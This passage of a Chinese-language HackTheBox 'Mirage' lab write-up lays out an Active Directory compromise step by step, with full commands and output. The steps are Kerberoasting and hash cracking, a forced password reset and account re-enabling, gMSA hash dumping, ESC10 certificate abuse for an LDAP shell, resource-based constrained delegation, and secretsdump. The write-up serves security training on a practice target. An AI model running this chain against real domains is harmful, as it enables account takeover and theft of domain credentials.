6\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [+] All files processed successfully.\n</code></pre>\n<p>尝试执行 <code>Kerberoasting</code></p>\n<p>成功将<code>nathan.aadam</code> 的 <code>TGS</code> 票据导出来</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage GetUserSPNs.py mirage.htb/<span class=\"hljs-string\">'david.jjackson'</span>:<span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -dc-host DC01.mirage.htb -k -debug -outputfile SPNHASH\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket\n[+] Connecting to DC01.mirage.htb, port 389, SSL False\n[+] Using Kerberos Cache: david.jjackson.ccache\n[+] SPN LDAP/DC01.MIRAGE.HTB@MIRAGE.HTB not found <span class=\"hljs-keyword\">in</span> cache\n[+] AnySPN is True, looking <span class=\"hljs-keyword\">for</span> another suitable SPN\n[+] Returning cached credential <span class=\"hljs-keyword\">for</span> KRBTGT/MIRAGE.HTB@MIRAGE.HTB\n[+] Using TGT from cache\n[+] Trying to connect to KDC at MIRAGE.HTB:88\n[+] Total of records returned 4\nServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation \n------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------\nHTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-24 05:18:18.584667  2025-07-21 18:31:07.044066             \n\n[+] Using Kerberos Cache: david.jjackson.ccache\n[+] Returning cached credential <span class=\"hljs-keyword\">for</span> KRBTGT/MIRAGE.HTB@MIRAGE.HTB\n[+] Using TGT from cache\n[+] Username retrieved from CCache: david.jjackson\n[+] Trying to connect to KDC at MIRAGE.HTB:88\n</code></pre>\n<p>爆破票据得到密码：<code>3edc#EDC3</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mirage hashcat -m 13100 SPNHASH /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image5.png\" alt=\"image.png\"></p>\n<p>远程登录上去，拿到立足点</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getTGT.py mirage.htb/<span class=\"hljs-string\">'NATHAN.AADAM'</span>:<span class=\"hljs-string\">'3edc#EDC3'</span> -dc-ip 10.10.11.78\n\n➜  Mirage <span class=\"hljs-built_in\">export</span> KRB5CCNAME=NATHAN.AADAM.ccache \n\n➜  Mirage evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB -u NATHAN.AADAM -p <span class=\"hljs-string\">'3edc#EDC3'</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image6.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\nathan.aadam\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\nb34xxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h3>To <strong>MARK.BBOND</strong></h3>\n<p>又看了一下 <code>BloodHound</code>，发现 <code>MARK.BBOND</code> 可以修改 ****<code>JAVIER.MMARSHALL</code> 的密码</p>\n<p>所以暂时为下一个目标用户</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image7.png\" alt=\"image.png\"></p>\n<p>使用 <code>Winpeas</code> 来收集信息</p>\n<p>发现 <code>mark.bbond</code> 用户在<code>AutoLogon</code>中有自动登录的明文凭据</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image8.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getTGT.py mirage.htb/<span class=\"hljs-string\">'mark.bbond'</span>:<span class=\"hljs-string\">'1day@atime'</span> -dc-ip 10.10.11.78\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> mark.bbond.ccache\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage nxc smb dc01.mirage.htb --use-kcache -k     \nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] MIRAGE.HTB\\mark.bbond from ccache\n</code></pre>\n<h3>To JAVIER.MMARSHALL</h3>\n<p>从上面可以知道用户<code>mark.bbond</code> 可以强制修改 <code>JAVIER.MMARSHALL</code> 用户的密码</p>\n<p>通过 <code>bloodyAD</code> 来实现</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD -d <span class=\"hljs-string\">'mirage.htb'</span> -k --host dc01.mirage.htb <span class=\"hljs-built_in\">set</span> password <span class=\"hljs-string\">'JAVIER.MMARSHALL'</span> <span class=\"hljs-string\">'Password@123'</span>\n[+] Password changed successfully!\n</code></pre>\n<p>请求 <code>TGT</code> 时会提示，用户被禁用了</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getTGT.py mirage.htb/<span class=\"hljs-string\">'JAVIER.MMARSHALL'</span>:<span class=\"hljs-string\">'Password@123'</span> -dc-ip 10.10.11.78\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nKerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n</code></pre>\n<p>我们通过 <code>BloodyAD</code>查一下是否被禁用了</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get object <span class=\"hljs-string\">\"mark.bbond\"</span> --attr userAccountControl\n\ndistinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb\nuserAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD\n\n➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get object <span class=\"hljs-string\">\"javier.mmarshall\"</span> --attr userAccountControl\n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nuserAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT\n</code></pre>\n<p><code>ACCOUNTDISABLE</code> 用户被禁用了，我们将其<code>ACCOUNTDISABLE</code> 属性删掉</p>\n<p>我们有强制修改其密码的权限，那么应该可以修改账户属性</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> remove uac <span class=\"hljs-string\">'javier.mmarshall'</span> -f ACCOUNTDISABLE\n[-] [<span class=\"hljs-string\">'ACCOUNTDISABLE'</span>] property flags removed from javier.mmarshall<span class=\"hljs-string\">'s userAccountControl\n</span></code></pre>\n<p>设置完后我们再查看一次</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get object <span class=\"hljs-string\">\"javier.mmarshall\"</span> --attr userAccountControl\n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nuserAccountControl: NORMAL_ACCOUNT\n</code></pre>\n<p>对比正常的用户还少一个密码永不过期，我们也给他添加上去</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> add uac <span class=\"hljs-string\">'javier.mmarshall'</span> -f DONT_EXPIRE_PASSWORD\n[-] [<span class=\"hljs-string\">'DONT_EXPIRE_PASSWORD'</span>] property flags added to javier.mmarshall<span class=\"hljs-string\">'s userAccountControl\n</span></code></pre>\n<p>但还是失败了</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getTGT.py mirage.htb/<span class=\"hljs-string\">'JAVIER.MMARSHALL'</span>:<span class=\"hljs-string\">'Password@123'</span> -dc-ip 10.10.11.78                                                                     \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nKerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n</code></pre>\n<p>最后发现还需要修改<code>Logon Hours</code> ，因为<code>javier.mmarshall</code> 的 <code>LogonHours</code> 是空的</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get object <span class=\"hljs-string\">\"javier.mmarshall\"</span> --attr LogonHours \n\ndistinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb\nlogonHours: \n\n➜  Mirage bloodyAD --kerberos -u <span class=\"hljs-string\">\"mark.bbond\"</span> -p <span class=\"hljs-string\">'1day@atime'</span> -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get object <span class=\"hljs-string\">\"mark.bbond\"</span> --attr LogonHours\n\ndistinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb\nlogonHours: ////////////////////////////\n</code></pre>\n<p>通过文章可以得到命令：<a href=\"https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/#powershell\">https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/#powershell</a></p>\n<pre><code class=\"hljs language-powershell\"># 在 NATHAN.AADAM 中运行\n$LogonHours = get-aduser mark.bbond -property logonhours | select-object -expand logonhours\n[byte[]]$Hours = $LogonHours\n$SecPassword = ConvertTo-SecureString '1day@atime' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('MIRAGE\\mark.bbond', $SecPassword)\nset-aduser javier.mmarshall -Cred $Cred -replace @{logonhours = $Hours}\n</code></pre>\n<p>最后我们再拿他的<code>TGT</code></p>\n<pre><code class=\"hljs language-bash\">getTGT.py mirage.htb/<span class=\"hljs-string\">'JAVIER.MMARSHALL'</span>:<span class=\"hljs-string\">'Password@123'</span> -dc-ip 10.10.11.78\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image9.png\" alt=\"image.png\"></p>\n<h3>To Mirage-Service$</h3>\n<p>通过视图能知道 <code>JAVIER.MMARSHALL</code> 能读取<code>Mirage-Service$</code> 的<code>GMSA</code>密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image10.png\" alt=\"image.png\"></p>\n<p>使用 <code>gMSADumper</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mirage python gMSADumper.py -d mirage.htb -k\nUsers or <span class=\"hljs-built_in\">groups</span> <span class=\"hljs-built_in\">who</span> can <span class=\"hljs-built_in\">read</span> password <span class=\"hljs-keyword\">for</span> Mirage-Service$:\n > javier.mmarshall\nMirage-Service$:::305806d84f7c1be93a07aaf40f0c7866\nMirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae\nMirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd\n</code></pre>\n<p><code>TGT</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getTGT.py mirage.htb/<span class=\"hljs-string\">'MIRAGE-SERVICE$'</span> -hashes :305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.10.11.78 \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> MIRAGE-SERVICE$.ccache\n</code></pre>\n<h3>枚举漏洞</h3>\n<p>拿到<code>Mirage-Service$</code> 后，在<code>BLoodHound</code>中不能直接看到对其他节点有修改权限了</p>\n<p>这里枚举了好一会，没摸出来什么思路</p>\n<p>枚举<code>ADCS</code>的漏洞，也是没能枚举出来漏洞</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage <span class=\"hljs-built_in\">cat</span> 20250722043730_Certipy.txt\nCertificate Authorities\n  0\n    CA Name                             : mirage-DC01-CA\n    DNS Name                            : dc01.mirage.htb\n    Certificate Subject                 : CN=mirage-DC01-CA, DC=mirage, DC=htb\n    Certificate Serial Number           : 1512EEC0308E13A146A0B5AD6AA741C9\n    Certificate Validity Start          : 2025-07-04 19:58:25+00:00\n    Certificate Validity End            : 2125-07-04 20:08:25+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption <span class=\"hljs-keyword\">for</span> Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : MIRAGE.HTB\\Administrators\n      Access Rights\n        ManageCa                        : MIRAGE.HTB\\Administrators\n                                          MIRAGE.HTB\\Domain Admins\n                                          MIRAGE.HTB\\Enterprise Admins\n        ManageCertificates              : MIRAGE.HTB\\Administrators\n                                          MIRAGE.HTB\\Domain Admins\n                                          MIRAGE.HTB\\Enterprise Admins\n        Enroll                          : MIRAGE.HTB\\Authenticated Users\nCertificate Templates                   : [!] Could not find any certificate templates\n</code></pre>\n<p>但是一些 <code>ESC</code>是无法被脚本探测到的，例如 <code>ESC10</code> ：<a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</a></p>\n<p><code>ESC10</code> 的先决条件：</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image11.png\" alt=\"image.png\"></p>\n<p>我们首先检查 <code>CertificateMappingMethods</code> 注册表项</p>\n<p>可以看到<code>CertificateMappingMethods</code> 注册表项为 <code>0x4</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\nathan.aadam\\Documents> reg query <span class=\"hljs-string\">\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\\"\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\n    EventLogging    REG_DWORD    0x1\n    CertificateMappingMethods    REG_DWORD    0x4\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\CipherSuites\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Hashes\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\n</span></code></pre>\n<p>然后第二步是需要找到一个能够修改受害者账户的<code>userPrincipalName</code> 属性账户，通常是<code>GenericWrite</code> 或 <code>WriteProperty</code> 权限来实现的</p>\n<p>查看 <code>MIRAGE-SERVICE$</code> 用户的可写属性</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">export</span> KRB5CCNAME=MIRAGE-SERVICE\\$.ccache\nbloodyAD --kerberos -d <span class=\"hljs-string\">\"mirage.htb\"</span> --host <span class=\"hljs-string\">\"dc01.mirage.htb\"</span> get writable --detail\n</code></pre>\n<p>能发现 <code>MIRAGE-SERVICE$</code> 可以对 <code>mark.bbond</code> 的 <code>UPN</code> 属性可写</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image12.png\" alt=\"image.png\"></p>\n<h3>ESC 10</h3>\n<p>跟着链接走即可：<a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</a></p>\n<pre><code class=\"hljs language-bash\">➜  Mirage certipy-ad account -dc-ip 10.10.11.78 -k -upn <span class=\"hljs-string\">'dc01$@mirage.htb'</span> -target dc01.mirage.htb -user <span class=\"hljs-string\">'mark.bbond'</span> update \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user <span class=\"hljs-string\">'mark.bbond'</span>:\n    userPrincipalName                   : dc01<span class=\"hljs-variable\">$@mirage</span>.htb\n[*] Successfully updated <span class=\"hljs-string\">'mark.bbond'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage <span class=\"hljs-built_in\">export</span> KRB5CCNAME=mark.bbond.ccache \n➜  Mirage certipy-ad req -dc-ip 10.10.11.78 -k -target <span class=\"hljs-string\">'dc01.mirage.htb'</span> -ca <span class=\"hljs-string\">'mirage-DC01-CA'</span> -template <span class=\"hljs-string\">'User'</span>\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail\n[*] Requesting certificate via RPC\n[*] Request ID is 13\n[*] Successfully requested certificate\n[*] Got certificate with UPN <span class=\"hljs-string\">'dc01$@mirage.htb'</span>\n[*] Certificate object SID is <span class=\"hljs-string\">'S-1-5-21-2127163471-3824721834-2568365109-1109'</span>\n[*] Saving certificate and private key to <span class=\"hljs-string\">'dc01.pfx'</span>\nFile <span class=\"hljs-string\">'dc01.pfx'</span> already exists. Overwrite? (y/n - saying no will save with a unique filename): y\n[*] Wrote certificate and private key to <span class=\"hljs-string\">'dc01.pfx'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage certipy-ad account -dc-ip 10.10.11.78 -k -upn <span class=\"hljs-string\">'mark.bbond@mirage.htb'</span> -target dc01.mirage.htb -user <span class=\"hljs-string\">'mark.bbond'</span> update \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user <span class=\"hljs-string\">'mark.bbond'</span>:\n    userPrincipalName                   : mark.bbond@mirage.htb\n[*] Successfully updated <span class=\"hljs-string\">'mark.bbond'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell                                                            \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: <span class=\"hljs-string\">'dc01$@mirage.htb'</span>\n[*]     Security Extension SID: <span class=\"hljs-string\">'S-1-5-21-2127163471-3824721834-2568365109-1109'</span>\n[*] Connecting to <span class=\"hljs-string\">'ldaps://10.10.11.78:636'</span>\n[*] Authenticated to <span class=\"hljs-string\">'10.10.11.78'</span> as: <span class=\"hljs-string\">'u:MIRAGE\\\\DC01$'</span>\nType <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> list of commands\n\n<span class=\"hljs-comment\"># whoami</span>\nu:MIRAGE\\DC01$\n</code></pre>\n<p>拿到 <code>LDAP shell</code>后，我们直接设置<code>RBCD</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># set_rbcd dc01$ NATHAN.AADAM</span>\nFound Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb\nTarget SID: S-1-5-21-2127163471-3824721834-2568365109-1000\n\nFound Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb\nGrantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110\nDelegation rights modified successfully!\nNATHAN.AADAM can now impersonate <span class=\"hljs-built_in\">users</span> on dc01$ via S4U2Proxy\n</code></pre>\n<p>常规打法</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage getST.py -spn <span class=\"hljs-string\">'cifs/dc01.mirage.htb'</span> -impersonate <span class=\"hljs-string\">'DC01$'</span> <span class=\"hljs-string\">'mirage.htb/nathan.aadam:3edc#EDC3'</span>\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT <span class=\"hljs-keyword\">for</span> user\n[*] Impersonating DC01$\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> DC01<span class=\"hljs-variable\">$@cifs_dc01</span>.mirage.htb@MIRAGE.HTB.ccache\n</code></pre>\n<p>最后直接上 <code>secretsdump</code> 即可</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage <span class=\"hljs-built_in\">export</span> KRB5CCNAME=DC01\\<span class=\"hljs-variable\">$@cifs_dc01</span>.mirage.htb@MIRAGE.HTB.ccache\n➜  Mirage secretsdump.py mirage.htb/<span class=\"hljs-string\">'DC01$'</span>@dc01.mirage.htb -k -no-pass\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image13.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\n491xxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>任重道远，比之前打的顺很多了</p>\n<p>前期 <code>Nats</code> 的利用没想到，其实并不难，只是脑筋转不过来</p>\n<p>最难的不是利用漏洞，而是寻找漏洞，<code>ESC10</code> 我是真的想不到那边去，因为在<code>BloodHound</code>中，我并没有找到证书颁发机构，最后枚举了了一下才发现有</p>","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","updated":"2025-07-22","tags":["HackTheBox","Windows","Nats-server","Kerberoasting","BloodyAD","ESC10","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Mirage\n\n https://app.hackthebox.com/machines/Mirage | `Windows` | `Hard`\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举测试\n\n`SMB` 匿名测试\n\n\n\n`RPC` 匿名测试\n\n\n\n`NFS` 枚举\n\n\n\n发现 `/MirageReports`\n\n将其挂载到本机上\n\n\n\n里边是两个`PDF`文件...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"}]},"__N_SSG":true}